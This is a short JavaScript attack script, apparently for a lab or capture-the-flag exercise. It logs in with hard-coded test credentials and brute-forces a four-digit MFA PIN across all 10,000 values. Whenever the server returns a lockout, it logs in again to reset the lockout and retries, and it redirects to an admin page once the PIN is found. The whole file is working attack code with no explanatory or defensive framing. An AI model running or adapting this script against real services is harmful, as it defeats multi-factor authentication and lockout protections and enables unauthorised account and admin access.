const CREDENTIALS = {
    username: "testuser",
    password: "testuser"
};

async function login() {
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(CREDENTIALS)
        });

        if (!response.ok) return false;

        const result = await response.json();
        localStorage.setItem('token', result.token);
        return true;
    } catch (err) {
        return false;
    }
}

async function verifyPin(pinValue) {
    const token = localStorage.getItem('token');
    const pin = pinValue.toString().padStart(4, '0');

    const response = await fetch('/api/mfa/verify', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ pin })
    });

    return { status: response.status, ok: response.ok, pin };
}

async function startExploit() {
    console.log("%c Starting Brute Force... ", "background: #222; color: #bada55; font-size: 16px;");
    console.time("Attack Duration");

    for (let i = 0; i <= 9999; i++) {
        let res = await verifyPin(i);

        if (res.ok) {
            console.timeEnd("Attack Duration");
            // redirect to the admin page
            setTimeout(() => {
                window.location.href = '/admin';
            }, 10000);
            return;
        }

        // If locked out (403), re-authenticate immediately and retry the same PIN
        if (res.status === 403) {
            console.warn(`Lockout detected at PIN ${res.pin}. Resetting...`);
            const reset = await login();
            if (reset) {
                i--; // Retry the current PIN
                continue;
            } else {
                console.error("Auth server stopped responding.");
                return;
            }
        }

        // Minimal logging to keep the UI thread from freezing
        if (i % 500 === 0) console.log(`Checking combinations... currently at ${i}`);
    }
}

// Start
(async () => {
    if (await login()) {
        await startExploit();
    } else {
        console.error("Initial login failed. Check credentials.");
    }
})();